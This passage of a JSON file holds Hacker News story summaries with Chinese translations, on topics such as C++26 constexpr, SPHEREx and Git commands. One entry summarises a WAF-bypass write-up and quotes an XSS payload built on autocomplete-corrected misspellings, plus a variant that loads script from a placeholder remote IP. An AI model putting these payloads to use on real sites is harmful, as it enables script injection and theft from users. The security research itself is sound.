    "chinese_summary": "C++26标准库中 constexpr 支持的增强：关键提案概览\n\n**稳定排序 (P2562R1)：** 引入了对 `std::stable_sort`, `std::stable_partition`, `std::inplace_merge` 及其 ranges 对应版本的 constexpr 支持。这与 constexpr 容器的引入相一致，从而支持编译时排序。实现使用 `std::is_constant_evaluated()` 来处理潜在的计算复杂度限制。\n\n**<cmath> 和 <complex> (P1383R2)：** 扩展了对 `<cmath>` 和 `<complex>` 函数的 constexpr 支持，同时承认了不同平台和编译器设置下浮点计算的潜在可变性。该提案在确定性和实际灵活性之间取得了平衡，允许某些函数具有平台相关的结果。\n\n**平凡联合体 (P3074R7)：** 解决了联合体特殊成员默认行为的局限性，尤其影响了使用未初始化存储的 constexpr 代码。该解决方案涉及修改联合体的默认构造函数和析构函数的处理方式，使其更易于 constexpr 使用。\n\n**容器和适配器 (P3372R2)：** 旨在使几乎所有容器和适配器都成为 constexpr。 以前，只有少数容器（如 `std::vector`）对 constexpr 友好。 目前排除了 `std::hive`，并且无序容器需要在编译时提供自定义哈希机制。\n\n**专用内存算法 (P3508R0 & P2283R2)：** 启用了对专用内存算法（如 `uninitialized_value_construct`, `uninitialized_copy`, `uninitialized_move`, `uninitialized_fill`）的 constexpr 支持，这对于实现 constexpr 容器是必需的。 这些更改涉及更新签名并利用 constexpr placement new。\n\n**未初始化默认构造 (P3369R0)：** 随着 constexpr placement new 的出现，`uninitialized_default_construct` 现在也可以变为 constexpr。\n\n总之，C++26 在算法、容器和底层内存操作方面显著增强了标准库中的 constexpr 支持，使编译时编程更加强大。 下一篇文章将介绍编译时异常。"
  },
  {
    "id": "43865824",
    "title": "Bypassing a web application firewall with autocomplete",
    "url": "https://jessie.cafe/posts/bypassing-a-waf-with-autocomplete/",
    "summary": "This article details a method for bypassing a Web Application Firewall (WAF) using an autocomplete feature in a website's search functionality. The author discovered a vulnerability on a New Zealand website where the search box endpoint reflected user input without proper sanitization, seemingly allowing for JavaScript injection.\n\nHowever, the website employed Akamai's 'Kona Site Defender' WAF, which blocked simple attempts to inject `<script>` tags. The author observed that the search feature included an autocomplete mechanism. By exploiting the autocomplete, the author crafted a payload that circumvented the WAF.\n\nThe strategy involved using subtle misspellings that the WAF didn't detect but the autocomplete corrected into malicious code. Specifically, \"scripr\" was autocompleted to \"script,\" and \"alertt(\" was used to bypass the WAF's detection of \"alert(\". The final payload, `<scripr>alertt(document.domain)</scripr/>`, was transformed by the autocomplete into `<script>alert(document.domain)</script>`, enabling JavaScript execution in the browser.\n\nThe author further demonstrated that they could load external JavaScript using `<scripr/src=\"//<remote-ip>/\"></scripr/>`, noting that IP addresses were preferable to domain names due to autocomplete behavior. The article concludes by highlighting how transformations like autocomplete can be leveraged to bypass WAFs and filters.\n",
    "chinese_title": "使用自动完成绕过Web应用程序防火墙",
    "chinese_summary": "利用网站自动完成功能绕过Web应用防火墙(WAF)的方法：一个案例研究"
  },
  {
    "id": "43854776",
    "title": "When ChatGPT broke the field of NLP: An oral history",
    "url": "https://www.quantamagazine.org/when-chatgpt-broke-an-entire-field-an-oral-history-20250430/",
    "summary": "This article, \"When ChatGPT Broke an Entire Field: An Oral History,\" explores the impact of large language models (LLMs) on the field of natural language processing (NLP) through interviews with 19 researchers. It chronicles the shift in NLP, from traditional methods to the dominance of transformer models like BERT and GPT, starting around 2017.\n\nThe article highlights the initial skepticism surrounding transformers, followed by the \"benchmark boom\" and the realization that scaling up models was key to progress. The release of GPT-3 in 2020 is presented as a pivotal moment, revealing the potential of LLMs and triggering an \"existential crisis\" for some NLP researchers as many conventional tasks could be easily replicated.\n\nThe article also addresses the controversies surrounding LLMs, including debates about their \"understanding\" capabilities, concerns about safety limitations, and criticisms of \"API science\" due to the lack of open-source code and the commercialization of models. The tension between academic research and industry-driven advancements is explored, along with ethical concerns regarding the potential downsides of increasingly large language models. Ultimately, the article captures a period of rapid transformation and disruption within NLP, driven by the emergence and impact of LLMs.\n",
    "chinese_title": "ChatGPT 如何颠覆自然语言处理领域：口述史",
    "chinese_summary": "当ChatGPT颠覆整个领域：口述历史"
  },
  {
    "id": "43851612",
    "title": "How the US defense secretary circumvents official DoD communications equipment",
    "url": "https://www.electrospaces.net/2025/04/how-us-defense-secretary-hegseth.html",
    "summary": "This article details how US Secretary of Defense Pete Hegseth circumvented official DoD communications protocols to use the Signal messaging app. Despite having access to secure government communication systems like the Crisis Management System (CMS) and the Defense Red Switch Network (DRSN), Hegseth insisted on using Signal, a preferred method among Trump administration officials.\n\nUnable to install Signal on government-approved devices, Hegseth initially used Wi-Fi in a restricted area, potentially with a personal laptop or smartphone, a security violation. Later, he requested a direct internet line to his desk and acquired a personal computer, bypassing Pentagon security protocols altogether. He then installed Signal on this computer, effectively mirroring the app from his personal phone and seeking a program for regular text messages. This move was intended to overcome poor cellphone service in the Pentagon and facilitate communication with other Trump officials using Signal.\n\nThe article highlights the irony of Hegseth's actions given the existence of the Secretary of Defense Communications (SDC) unit, also known as SecDef Cables, which is specifically designed to provide secure communication capabilities for the Secretary and staff, regardless of location or classification level.\n\nThe article includes visual aids such as photos of Hegseth's and former Secretary Austin's offices, pointing out various communications equipment and their classification levels. It also provides links to news articles and online discussions about the issue.\n",
    "chinese_title": "美国防长如何规避官方国防部通讯设备",
    "chinese_summary": "本文详细介绍了美国国防部长皮特·赫格塞斯是如何绕过国防部官方通信协议，使用Signal通讯应用程序的。尽管可以使用诸如危机管理系统（CMS）和国防红线交换网络（DRSN）等安全的政府通信系统，赫格塞斯仍坚持使用Signal，这是特朗普政府官员中首选的通信方式。\n\n由于无法在政府批准的设备上安装Signal，赫格塞斯最初在限制区域内使用Wi-Fi，可能使用了个人笔记本电脑或智能手机，这违反了安全规定。后来，他要求在他的办公桌上安装一条直接互联网线路，并购买了一台个人电脑，完全绕过了五角大楼的安全协议。随后，他在这台电脑上安装了Signal，实际上是从他的个人手机上镜像了这个应用程序，并寻找一款用于常规短信的程序。此举旨在克服五角大楼糟糕的手机信号，并方便与使用Signal的其他特朗普官员进行沟通。\n\n文章强调了赫格塞斯行为的讽刺意味，因为国防部长通信（SDC）部门（也称为国防部长电报）的存在，该部门专门为部长及其工作人员提供安全的通信能力，无论其位置或保密级别如何。\n\n文章包括视觉辅助材料，例如赫格塞斯和前部长奥斯汀办公室的照片，指出了各种通信设备及其保密级别。文章还提供了指向有关该问题的新闻文章和在线讨论的链接。"
  },
  {
    "id": "43857856",
    "title": "Show HN: Hyperparam: OSS tools for exploring datasets locally in the browser",
    "url": "https://hyperparam.app/about/opensource",
    "summary": "Hyperparam is an open-source suite of tools designed to improve data quality in machine learning by enabling interactive, in-browser exploration and curation of large datasets. Their mission is to address the lack of user-friendly, scalable UIs for managing massive datasets and to put data quality at the forefront of model development.\n\nThe core philosophy is \"local-first and private,\" meaning the tools run entirely client-side, eliminating server dependencies and addressing security concerns. Hyperparam leverages efficient data formats and high-performance JavaScript libraries to allow users to interact with terabyte-scale datasets without heavy infrastructure.\n\nKey components include:\n\n*   **Hyparquet:** A pure-JS library for reading Parquet files in the browser.\n*   **Hyparquet-Writer:** A library for exporting data to Parquet format from JavaScript.\n*   **HighTable:** A React-based virtualized table component for viewing extremely large tables.\n*   **Icebird:** A JavaScript Apache Iceberg table reader.\n*   **Hyllama:** A JavaScript library to parse llama.cpp .gguf files.\n*   **Hyperparam CLI:** A command-line tool that launches a local web application for dataset viewing.\n\nThese tools work together to enable data scientists and engineers to explore, label, filter, and transform data at scale, using AI assistance where possible. The goal is to create a faster, easier to deploy, and more scalable data-centric AI workflow, ultimately leading to better models through improved data quality.\n",
    "chinese_title": "Show HN: Hyperparam：在浏览器本地探索数据集的开源工具",
    "chinese_summary": "Hyperparam 是一个开源工具套件，旨在通过支持交互式、浏览器内探索和管理大型数据集来提高机器学习中的数据质量。他们的使命是解决缺乏用户友好、可扩展的UI来管理海量数据集的问题，并将数据质量置于模型开发的最前沿。\n\n其核心理念是“本地优先和私有”，意味着这些工具完全在客户端运行，消除了服务器依赖并解决了安全问题。 Hyperparam 利用高效的数据格式和高性能的 JavaScript 库，使用户无需重型基础设施即可与 TB 级的数据集进行交互。\n\n主要组件包括：\n\n*   **Hyparquet:** 用于在浏览器中读取 Parquet 文件的纯 JS 库。\n*   **Hyparquet-Writer:** 用于从 JavaScript 将数据导出为 Parquet 格式的库。\n*   **HighTable:** 用于查看极大表格的基于 React 的虚拟化表格组件。\n*   **Icebird:** JavaScript Apache Iceberg 表格读取器。\n*   **Hyllama:** 用于解析 llama.cpp .gguf 文件的 JavaScript 库。\n*   **Hyperparam CLI:** 用于启动本地 Web 应用程序以查看数据集的命令行工具。\n\n这些工具协同工作，使数据科学家和工程师能够大规模地探索、标记、过滤和转换数据，并在可能的情况下使用 AI 辅助。其目标是创建一个更快、更易于部署和更可扩展的以数据为中心的人工智能工作流程，最终通过提高数据质量来获得更好的模型。"
  },
  {
    "id": "43867692",
    "title": "Apple App Store guidelines remove ban on encouraging external payments in US",
    "url": "https://developer.apple.com/app-store/review/guidelines/",
    "summary": "This document outlines Apple's App Store guidelines for developers. The core principle is to provide a safe user experience and a fair opportunity for developers. Apple emphasizes app review by experts, malware scanning, and editorial curation. In the EU, developers can now distribute notarized apps through alternative marketplaces and websites.\n\nThe guidelines are categorized into Safety, Performance, Business, Design, and Legal. Apps should avoid offensive content, protect children, and not promote physical harm. User-generated content must be moderated. Medical apps face stricter scrutiny, and apps encouraging substance abuse or reckless behavior are prohibited.\n\nDevelopers must provide accurate contact information. Data security is paramount. Apps reporting criminal activity must involve local law enforcement.\n\nKey considerations for app approval include thorough testing, accurate metadata, accessible backend services, and detailed explanations of non-obvious features. Apps should also adhere to Apple's design and branding guidelines. Failure to comply can lead to app rejection or removal.\n",
    "chinese_title": "苹果应用商店指南取消美国地区鼓励外部支付禁令",
    "chinese_summary": "本文概述了苹果公司针对开发者的 App Store 指南。其核心原则是为用户提供安全的使用体验，并为开发者提供公平的机会。苹果强调专家的应用审核、恶意软件扫描以及编辑精选。在欧盟，开发者现在可以通过替代市场和网站分发经过公证的应用。\n\n该指南分为安全、性能、商业、设计和法律类别。应用应避免冒犯性内容，保护儿童，且不得宣扬人身伤害。用户生成的内容必须经过审核。医疗应用面临更严格的审查，而鼓励药物滥用或鲁莽行为的应用是被禁止的。\n\n开发者必须提供准确的联系信息。数据安全至关重要。报告犯罪活动的应用必须与当地执法部门合作。\n\n应用审批的关键考虑因素包括彻底的测试、准确的元数据、可访问的后端服务以及对非显而易见功能的详细解释。应用还应遵守苹果公司的设计和品牌指南。不遵守规定可能导致应用被拒绝或移除。"
  },
  {
    "id": "43852446",
    "title": "Blood droplets on inclined surfaces reveal new cracking patterns",
    "url": "https://phys.org/news/2025-04-blood-droplets-inclined-surfaces-reveal.html",
    "summary": "This Science X article discusses research published in *Langmuir* exploring how blood droplets dry on inclined surfaces, revealing new cracking patterns. Researchers Bibek Kumar, Sangamitro Chatterjee, Amit Agrawal, and Rajneesh Bhardwaj studied the drying process of blood droplets ranging in size from 1 to 10 microliters on surfaces tilted at angles from 0 to 70 degrees, using optical microscopy, high-speed cameras, and surface profilers.\n\nThe study found that on flat surfaces, the drying blood formed coffee-ring-like deposits with radial and azimuthal cracks. However, on inclined surfaces, gravity caused red blood cells to accumulate downhill, creating asymmetric deposits. The advancing (downhill) side exhibited thicker, more widely spaced cracks, while the receding (uphill) side showed finer cracks. Larger droplets amplified this asymmetry, leaving a \"tail\" of dried blood.\n\nThe researchers developed a theoretical model to explain these patterns, attributing the asymmetric cracking to uneven mechanical stress distribution on either side of the droplet. The findings have implications for forensic science, where bloodstain pattern analysis (BPA) is used to reconstruct crime scenes. The research suggests that surface tilt and droplet size significantly affect bloodstain patterns, potentially leading to misinterpretations if ignored. This research is part of the Science X Dialog, where researchers can report findings from their published research articles.\n",
    "chinese_title": "倾斜表面上的血滴揭示新的裂纹模式",
    "chinese_summary": "Science X文章探讨了发表在*Langmuir*上的研究，该研究探索了血液滴在倾斜表面上的干燥方式，揭示了新的裂纹模式。研究人员Bibek Kumar、Sangamitro Chatterjee、Amit Agrawal和Rajneesh Bhardwaj利用光学显微镜、高速摄像机和表面轮廓仪，研究了尺寸为1到10微升的血滴在倾斜角度为0到70度的表面上的干燥过程。\n\n研究发现，在平面上，干燥的血液形成类似咖啡环的沉积物，并带有径向和方位角裂纹。然而，在倾斜表面上，重力导致红细胞向下坡方向积聚，形成不对称的沉积物。前进（下坡）侧表现出更厚、间距更宽的裂纹，而后退（上坡）侧则显示出更细的裂纹。较大的液滴会放大这种不对称性，留下干燥血液的“尾巴”。\n\n研究人员开发了一个理论模型来解释这些模式，将不对称的裂纹归因于液滴两侧不均匀的机械应力分布。这些发现对法医学具有重要意义，法医学中使用血迹形态分析 (BPA) 来重建犯罪现场。该研究表明，表面倾斜度和液滴大小会显着影响血迹模式，如果忽略这些因素，可能会导致误解。这项研究是Science X Dialog的一部分，研究人员可以在此报告已发表研究文章的结果。"
  },
  {
    "id": "43872168",
    "title": "Alzheimers could be linked to a common virus",
    "url": "https://www.sciencealert.com/alzheimers-could-be-linked-to-a-common-virus-you-already-have",
    "summary": "This article explores the potential link between the herpes simplex virus type 1 (HSV-1), the virus responsible for cold sores, and Alzheimer's disease. Research suggests that HSV-1 can reside dormant in the brain and reactivate later in life, causing inflammation and damage that contribute to Alzheimer's, particularly in individuals with the APOE-e4 gene.\n\nStudies have found HSV-1 DNA within the amyloid plaques in the brains of Alzheimer's patients, and antiviral treatments have shown promise in reducing damage in lab settings. Population studies further support this connection, demonstrating that severe HSV-1 infections are strong predictors of Alzheimer's and that antiviral treatments can reduce the risk.\n\nThe article also discusses the potential role of other dormant viruses, such as varicella zoster (chickenpox/shingles), and the protective effect of the shingles vaccine against dementia. Research indicates that infections and head injuries can trigger HSV-1 reactivation in the brain, leading to Alzheimer's-like damage, while anti-inflammatory treatments can prevent this.\n\nThe author suggests that vaccines and antiviral treatments targeting HSV-1 could be potential strategies for preventing or slowing the progression of Alzheimer's disease, offering a new avenue for understanding and combating this devastating illness.\n",
    "chinese_title": "阿尔茨海默症或与常见病毒有关",
    "chinese_summary": "本文探讨了单纯疱疹病毒1型（HSV-1，导致唇疱疹的病毒）与阿尔茨海默病之间的潜在联系。研究表明，HSV-1可在脑内潜伏，并在晚年重新激活，引起炎症和损害，从而导致阿尔茨海默病，尤其是在携带APOE-e4基因的个体中。\n\n研究发现，阿尔茨海默病患者大脑的淀粉样斑块中存在HSV-1 DNA，抗病毒治疗已显示出在实验室环境中减少损害的潜力。人群研究进一步支持了这种联系，表明严重的HSV-1感染是阿尔茨海默病的强烈预测指标，抗病毒治疗可以降低患病风险。\n\n本文还讨论了其他潜伏病毒的潜在作用，如水痘带状疱疹病毒（水痘/带状疱疹），以及带状疱疹疫苗对痴呆症的保护作用。研究表明，感染和头部损伤会触发脑内HSV-1的重新激活，导致类似于阿尔茨海默病的损害，而抗炎治疗可以预防这种情况。\n\n作者认为，针对HSV-1的疫苗和抗病毒治疗可能是预防或减缓阿尔茨海默病进展的潜在策略，为理解和对抗这种毁灭性疾病提供了一条新的途径。"
  },
  {
    "id": "43869627",
    "title": "NASA's SPHEREx Space Telescope Begins Capturing Entire Sky",
    "url": "https://www.nasa.gov/missions/spherex/nasas-spherex-space-telescope-begins-capturing-entire-sky/",
    "summary": "NASA's SPHEREx space telescope has commenced its mission to map the entire sky in 102 infrared colors, a feat never before accomplished. Launched on March 11, 2025, the observatory spent six weeks undergoing tests and calibrations before beginning regular science operations on May 1. For the next two years, SPHEREx will capture roughly 3,600 images daily, aiming to provide insights into the origins of the universe, galaxies, and the building blocks of life within the Milky Way.\n\nOrbiting Earth 14½ times a day, SPHEREx captures images along a circular strip of the sky. As Earth orbits the Sun, the telescope's field of view shifts, allowing it to observe the entire sky every six months. The telescope uses spectroscopy to separate light into wavelengths, providing information about cosmic sources. This helps determine galaxy distances, measure the collective glow of all galaxies over time, and reveal the composition of objects, including the search for water in interstellar clouds.\n\nScientists believe that by mapping the entire sky in infrared, SPHEREx can uncover clues about cosmic inflation, the rapid expansion of the universe in its earliest moments. The mission will also map interstellar clouds to understand how different conditions affect the chemistry that led to the formation of compounds found on Earth. SPHEREx is expected to produce four all-sky maps and its data will be publicly available through the NASA-IPAC Infrared Science Archive.\n",
    "chinese_title": "美国宇航局SPHEREx太空望远镜开始捕获整个天空",
    "chinese_summary": "NASA的SPHEREx太空望远镜已启动任务，以前所未有的方式，绘制整个天空的102种红外颜色图。该天文台于2025年3月11日发射，在5月1日开始常规科学运行前，进行了为期六周的测试和校准。在接下来的两年里，SPHEREx每天将拍摄约3600张图像，旨在深入了解宇宙、星系的起源以及银河系内生命的基石。\n\nSPHEREx每天绕地球飞行14圈半，沿天空中的圆形带状区域捕捉图像。随着地球绕太阳运行，望远镜的视野会发生变化，使其每六个月就能观测整个天空。该望远镜使用光谱学将光分解成波长，提供有关宇宙源的信息。这有助于确定星系距离，测量所有星系随时间的集体辉光，并揭示物体的组成，包括在星际云中寻找水。\n\n科学家们认为，通过绘制整个天空的红外图，SPHEREx可以揭示宇宙膨胀的线索，即宇宙在最初时刻的快速膨胀。该任务还将绘制星际云图，以了解不同条件如何影响导致地球上化合物形成的化学反应。SPHEREx预计将生成四张全天图，其数据将通过NASA-IPAC红外科学档案馆公开提供。"
  },
  {
    "id": "43856801",
    "title": "Linkwarden: FOSS self-hostable bookmarking with AI-tagging and page archival",
    "url": "https://linkwarden.app/",
    "summary": "Linkwarden is a self-hostable, open-source bookmarking tool designed to collect, organize, and preserve web pages and documents. It offers features such as organizing links with collections, sub-collections, and AI-generated tags, and automatically preserving webpage content as screenshots and HTML to combat link rot.\n\nThe platform facilitates collaboration, allowing users to share collections and assign permissions to team members. Key features include responsive design, dark/light mode, powerful search capabilities, a browser extension, and import/export functionality. It also offers a PWA for mobile app-like experience and secure API integration.\n\nLinkwarden caters to personal use, design inspiration, research, and project collaboration, helping users organize bookmarks, collaborate seamlessly, preserve content, and easily access online materials.\n\nUser testimonials highlight Linkwarden's value as an all-in-one bookmarking solution with archiving capabilities.\n\nLinkwarden offers both cloud-hosted and self-hosted options with varying link limits and features. The cloud plan starts at $3/month per user. FAQs address common questions about trials, data storage, and plan customization.\n",
    "chinese_title": "Linkwarden：基于FOSS的自托管书签，具备AI标签和页面归档功能",
    "chinese_summary": "Linkwarden：一款自托管、开源的书签工具，旨在收集、整理和保存网页及文档。它提供诸如使用集合、子集合和AI生成的标签来组织链接，以及自动将网页内容保存为屏幕截图和HTML以对抗链接失效等功能。\n\n该平台促进协作，允许用户共享集合并为团队成员分配权限。主要功能包括响应式设计、深色/浅色模式、强大的搜索功能、浏览器扩展程序以及导入/导出功能。它还提供PWA以获得类似移动应用程序的体验以及安全的API集成。\n\nLinkwarden适用于个人使用、设计灵感、研究和项目协作，帮助用户组织书签、无缝协作、保存内容并轻松访问在线资料。\n\n用户评价强调了Linkwarden作为具有存档功能的All-in-One书签解决方案的价值。\n\nLinkwarden提供云托管和自托管选项，具有不同的链接限制和功能。云计划起价为每用户每月3美元。常见问题解答解答了有关试用、数据存储和计划自定义的常见问题。"
  },
  {
    "id": "43870999",
    "title": "Git Commands That Cover 90% of a Developer's Daily Workflow",
    "url": "https://jsdev.space/15-git-commands/",
    "summary": "This article provides a practical guide to the most essential Git commands needed for a developer's daily workflow. It focuses on commands that address common tasks, helping developers save time and avoid headaches.\n\nThe guide covers fifteen core Git commands: `git init` (creates a new repository), `git clone` (creates a local copy of a remote repo), `git status` (shows the current state of the working directory), `git add` (stages files for commit), `git commit` (saves a snapshot of staged changes with a message), `git diff` (shows differences between files), `git log` (displays commit history), `git reset` (resets staging area or moves HEAD), `git checkout` (switches branches or restores files; alternatives `git switch` and `git restore` are suggested), `git branch` (lists, creates, and deletes branches), `git merge` (combines changes from one branch into another), `git pull` (downloads and merges changes from a remote repository), `git push` (uploads local commits to a remote repository), `git stash` (temporarily saves changes), and `git remote` (manages remote repositories).\n\nFor each command, the article provides explanations, usage examples, and helpful tips. It emphasizes the importance of using `git status` and `git log` frequently, encouraging the use of branching and stashing for safe experimentation, and advocating for writing clear and meaningful commit messages. Mastering these commands provides a solid foundation for effective Git usage.\n",
    "chinese_title": "涵盖开发者90%日常工作流的Git命令",
    "chinese_summary": "本文提供了一份实用的指南，介绍了开发者日常工作流程中最必要的 Git 命令。它侧重于解决常见任务的命令，帮助开发者节省时间并避免麻烦。\n\n本指南涵盖了十五个核心 Git 命令：`git init`（创建一个新的仓库）、`git clone`（创建远程仓库的本地副本）、`git status`（显示工作目录的当前状态）、`git add`（暂存文件以进行提交）、`git commit`（保存带有消息的暂存更改的快照）、`git diff`（显示文件之间的差异）、`git log`（显示提交历史）、`git reset`（重置暂存区或移动 HEAD）、`git checkout`（切换分支或恢复文件；建议使用替代方案 `git switch` 和 `git restore`）、`git branch`（列出、创建和删除分支）、`git merge`（将一个分支的更改合并到另一个分支中）、`git pull`（从远程仓库下载并合并更改）、`git push`（将本地提交上传到远程仓库）、`git stash`（临时保存更改）以及 `git remote`（管理远程仓库）。\n\n对于每个命令，本文都提供了说明、使用示例和有用的提示。 它强调了频繁使用 `git status` 和 `git log` 的重要性，鼓励使用分支和储藏进行安全实验，并提倡编写清晰且有意义的提交消息。 掌握这些命令为有效使用 Git 奠定了坚实的基础。"
  },
  {
    "id": "43858442",
    "title": "Are you the same person you used to be? (2022)",
    "url": "https://www.newyorker.com/magazine/2022/10/10/are-you-the-same-person-you-used-to-be-life-is-hard-the-origins-of-you",
    "summary": "This article explores the question of whether we remain the same person throughout our lives, or if we change substantially. The author reflects on his own fragmented childhood memories and wonders how much his young son will remember of their current joyful experiences. He introduces the concepts of \"continuers\" and \"dividers,\" those who feel connected to their past selves and those who see their lives as a series of distinct phases, respectively.\n\nThe piece delves into the Dunedin study, a decades-long prospective study that tracked a thousand children from age three onwards. This study categorized children based on personality traits like being well-adjusted, confident, reserved, inhibited, or undercontrolled. By age eighteen, the inhibited and undercontrolled children displayed more consistent tendencies, leading researchers to identify groups \"moving away from the world\" or \"moving against the world.\"\n\nThe study highlights the durability of temperament, explaining how early dispositions shape social environments and reinforce behavior. However, it also suggests that positive relationships and mentorship can help individuals break out of negative cycles. Ultimately, the author contends that while studies like the Dunedin provide valuable insights into developmental trends, they don't fully capture the complex and personal question of identity. Our actions, not just our dispositions, define who we are. Although temperament contributes to the individual that one becomes, positive relationships may help one find a better path. While the story of life is already written to some extent, it is always possible to rewrite it.\n",
    "chinese_title": "你还是以前的你吗？(2022)",
    "chinese_summary": "我们一生中是否还是同一个人，或者是否发生了实质性的改变，本文探讨了这个问题。作者反思了自己支离破碎的童年记忆，并想知道他年幼的儿子会对他们目前快乐的经历记住多少。他介绍了“连续者”和“分裂者”的概念，前者觉得自己与过去的自己有关联，后者则将自己的生活视为一系列不同的阶段。\n\n这篇文章深入研究了达尼丁研究，这是一项长达数十年的前瞻性研究，追踪了一千名儿童从三岁开始的生活。这项研究根据儿童的性格特征（如适应良好、自信、内向、克制或失控）对他们进行了分类。到了十八岁，克制和失控的儿童表现出更加一致的倾向，导致研究人员确定了“远离世界”或“与世界对抗”的群体。\n\n该研究强调了气质的持久性，解释了早期性格如何塑造社会环境并强化行为。然而，它也表明，积极的关系和指导可以帮助个人摆脱消极的循环。最终，作者认为，虽然像达尼丁这样的研究为发展趋势提供了有价值的见解，但它们并没有完全捕捉到关于身份的复杂和个人问题。我们的行为，而不仅仅是我们的性格，定义了我们是谁。虽然气质会影响一个人，但积极的关系可以帮助一个人找到更好的道路。虽然人生的故事在某种程度上已经被写好了，但总是可以重写的。"
  },
  {
    "id": "43858826",
    "title": "How the Water System Works",
    "url": "https://www.thenewatlantis.com/publications/how-water-system-works",
    "summary": "This article, titled \"How the Water System Works,\" and subtitled \"We Live Like Royalty and Don't Know It,\" appears to be the introduction to a series, \"How the System Works,\" by Charles C. Mann. The introduction sets the stage by highlighting the often-overlooked infrastructure that underpins modern life, specifically focusing on the example of the water system. The title itself, \"How the Water System Works,\" implies a detailed explanation of the processes involved in delivering clean water to households. The subtitle, \"We Live Like Royalty and Don't Know It,\" suggests that the article will emphasize the ease and convenience with which we access potable water, a luxury that previous generations, and even people in other parts of the world today, do not experience. The byline indicates that Charles C. Mann is the author and that the article was written in Winter 2025. The overall impression is that the article will delve into the complex systems that provide our basic necessities, starting with water, and aim to shed light on the often-invisible labor and technology that make our comfortable lives possible.\n",
    "chinese_title": "水系统是如何运作的",
    "chinese_summary": "这篇文章题为《水系统如何运作》，副标题为《我们过着帝王般的生活却不自知》，似乎是查尔斯·C·曼恩撰写的“系统如何运作”系列文章的引言。引言通过强调支撑现代生活的、经常被忽视的基础设施来为文章定下基调，特别关注了水系统这个例子。标题本身《水系统如何运作》暗示了对向家庭输送清洁水的流程的详细解释。副标题《我们过着帝王般的生活却不自知》表明，这篇文章将强调我们获取饮用水的轻松和便利，这种奢侈是前几代人，甚至当今世界其他地区的人们都无法体验到的。署名表明查尔斯·C·曼恩是作者，并且这篇文章写于2025年冬季。总体印象是，这篇文章将深入研究提供我们基本必需品的复杂系统，从水开始，旨在揭示使我们舒适生活成为可能的、经常隐形的劳动和技术。"
  },
  {
    "id": "43851787",
    "title": "Building Private Processing for AI Tools on WhatsApp",
    "url": "https://engineering.fb.com/2025/04/29/security/whatsapp-private-processing-ai-tools/",
    "summary": "Meta is developing \"Private Processing,\" a new technology designed to allow WhatsApp users to utilize AI features like message summarization and writing suggestions in a privacy-preserving manner. This technology ensures that Meta and WhatsApp, along with any other third party, cannot access or share users' personal messages during AI processing.\n\nPrivate Processing leverages a Trusted Execution Environment (TEE) to create a secure cloud environment where AI models can analyze data without exposing it. This involves authentication, third-party routing, and the establishment of a secure session between the user's device and the TEE using Remote Attestation + Transport Layer Security (RA-TLS). Messages are encrypted end-to-end, and processing occurs in confidential virtual machines (CVMs) without storing any user data.\n\nKey principles include optionality, transparency, and user control, including the ability to prevent sensitive chats from being used for AI features. Meta emphasizes verifiable transparency and will allow independent security researchers to audit the architecture.\n\nTo defend against potential threats, Meta has developed a threat model considering malicious insiders, third parties, and end users. It has also identified threat scenarios such as external exploitation, data extraction through CVMs, and internal interference. The design emphasizes confidential processing, enforceable guarantees, and verifiable transparency, using confidential virtualization technologies and robust security measures to protect user data. Meta also plans to publish components of Private Processing and expand its Bug Bounty program to encourage external research.\n",
    "chinese_title": "在WhatsApp上构建AI工具的私有处理",
    "chinese_summary": "Meta正在开发“私密处理”技术，旨在让WhatsApp用户以保护隐私的方式使用消息总结和写作建议等人工智能功能。该技术确保Meta和WhatsApp以及任何其他第三方无法在人工智能处理期间访问或共享用户的个人消息。\n\n私密处理利用可信执行环境（TEE）创建一个安全云环境，使人工智能模型能够在不暴露数据的情况下分析数据。这涉及身份验证、第三方路由，以及使用远程证明+传输层安全协议（RA-TLS）在用户设备和TEE之间建立安全会话。消息采用端到端加密，处理发生在机密虚拟机（CVM）中，不存储任何用户数据。\n\n关键原则包括可选性、透明度和用户控制，包括阻止敏感聊天内容用于人工智能功能的能力。Meta强调可验证的透明度，并将允许独立的安全研究人员审核该架构。\n\n为了防御潜在威胁，Meta开发了一种威胁模型，考虑了恶意内部人员、第三方和最终用户。它还确定了威胁场景，例如外部利用、通过CVM提取数据以及内部干预。该设计强调机密处理、可执行的保证和可验证的透明度，使用机密虚拟化技术和强大的安全措施来保护用户数据。Meta还计划发布私密处理的组件，并扩大其漏洞赏金计划，以鼓励外部研究。"
  },
  {
    "id": "43862774",
    "title": "The Art of Managing Skunks",
    "url": "https://maheshba.bitbucket.io/blog/2025/02/09/2025-skunks.html",
    "summary": "This article outlines key principles for managing \"skunkworks\" projects – small, innovative teams within larger companies tasked with building new systems. The author draws on experiences leading two such projects, Delos at Meta and a new Kafka engine at Confluent, highlighting management challenges stemming from incentive structures that often clash with clean-slate innovation.\n\nThe core principles are: **A) Hands-on architects:** designers must code. **B) Shared ownership:** everyone is responsible and rewarded as a team. **C) Strength-based work:** focus on individual strengths, not weaknesses. **D) Precise communication:** formal documentation should be high-quality and tailored. **E) Collaborative design:** avoid a “first-doc-wins” culture that stifles participation. **F) Impact-based rewards:** promotions tied to shipping product. **G) Minimize dependencies:** control quality and avoid delays. **H) Understand project needs:** prioritize foundational elements early. **I) Prioritize \"Pigs\" over \"Chicken\":** favor committed, full-time engineers. **J) Eliminate unnecessary process.** **K) Progressively overload the team:** force ruthless prioritization and creative solutions. **L) Delay exiting skunkworks mode:** maintain the innovative culture until demonstrable success. **M) Embrace fail-fast:** establish concrete criteria for success and iterate quickly. **N) Aim for R&D:** balance innovation with practical application. **O) Synchronous communication:** foster shared understanding and collaboration. **P) Team composition matters:** select individuals for specific roles. **Q) Run toward risk:** tackle the most challenging areas. **R) Keep the team small:** maintain resource constraints and protect against cost-cutting.\n\nUltimately, the author emphasizes creating a unique culture within the larger organization, fostering teamwork, agility, and a focus on impactful results.\n",
    "chinese_title": "管理臭鼬的艺术",
